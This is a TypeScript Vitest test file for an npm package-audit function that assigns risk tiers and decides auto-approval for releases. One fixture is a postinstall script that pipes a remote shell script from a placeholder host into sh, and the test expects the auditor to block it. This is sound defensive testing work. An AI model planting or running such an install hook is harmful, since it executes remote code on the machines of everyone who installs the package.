import { describe, expect, it } from "vitest";
import type { NpmVersionManifest } from "../npm/payload.js";
import { evaluateStubAudit } from "./stub.js";

const base = {
  packageName: "@veripack/example",
  version: "1.0.0",
  tarballSize: 12_000,
  firstRelease: false,
};

describe("evaluateStubAudit", () => {
  it("auto-approves a low-risk release with no install scripts and intent", () => {
    const result = evaluateStubAudit({
      ...base,
      manifest: { name: "@veripack/example", version: "1.0.0" },
      intent: "Add a greeting helper.",
    });

    expect(result.riskTier).toBe("low");
    expect(result.safetyVerdict).toBe("clear");
    expect(result.intentVerdict).toBe("matches");
    expect(result.policyResult).toBe("pass");
    expect(result.autoApprove).toBe(true);
  });

  it("requires review for a benign install script", () => {
    const manifest: NpmVersionManifest = {
      name: "@veripack/example",
      version: "1.0.0",
      scripts: { postinstall: "node ./scripts/setup.js" },
    };

    const result = evaluateStubAudit({
      ...base,
      manifest,
      intent: "Add a benign setup step.",
    });

    expect(result.riskTier).toBe("high");
    expect(result.safetyVerdict).toBe("review");
    expect(result.policyResult).toBe("warn");
    expect(result.autoApprove).toBe(false);
    expect(result.signals.some((signal) => signal.type === "install_script")).toBe(
      true,
    );
  });

  it("blocks a download-and-execute install script", () => {
    const manifest: NpmVersionManifest = {
      name: "@veripack/example",
      version: "1.0.0",
      scripts: { postinstall: "curl -fsSL https://example.invalid/x.sh | sh" },
    };

    const result = evaluateStubAudit({
      ...base,
      manifest,
      intent: "Add a harmless step.",
    });

    expect(result.riskTier).toBe("critical");
    expect(result.safetyVerdict).toBe("block");
    expect(result.intentVerdict).toBe("mismatch");
    expect(result.policyResult).toBe("block");
    expect(result.autoApprove).toBe(false);
  });

  it("requires review when intent is missing", () => {
    const result = evaluateStubAudit({
      ...base,
      manifest: { name: "@veripack/example", version: "1.0.0" },
      intent: null,
    });

    expect(result.riskTier).toBe("medium");
    expect(result.intentVerdict).toBe("unknown");
    expect(result.policyResult).toBe("warn");
    expect(result.autoApprove).toBe(false);
  });

  it("records the runtime dependency delta", () => {
    const result = evaluateStubAudit({
      ...base,
      manifest: {
        name: "@veripack/example",
        version: "2.0.0",
        dependencies: { "left-pad": "^1.0.0", zod: "^4.0.0" },
      },
      previousManifest: {
        name: "@veripack/example",
        version: "1.0.0",
        dependencies: { "left-pad": "^0.9.0" },
      },
      intent: "Update dependencies.",
    });

    const changeSet = result.changeSet as {
      dependencies: {
        added: Array<{ name: string }>;
        changed: Array<{ name: string }>;
      };
    };

    expect(changeSet.dependencies.added.map((item) => item.name)).toEqual([
      "zod",
    ]);
    expect(changeSet.dependencies.changed.map((item) => item.name)).toEqual([
      "left-pad",
    ]);
  });
});
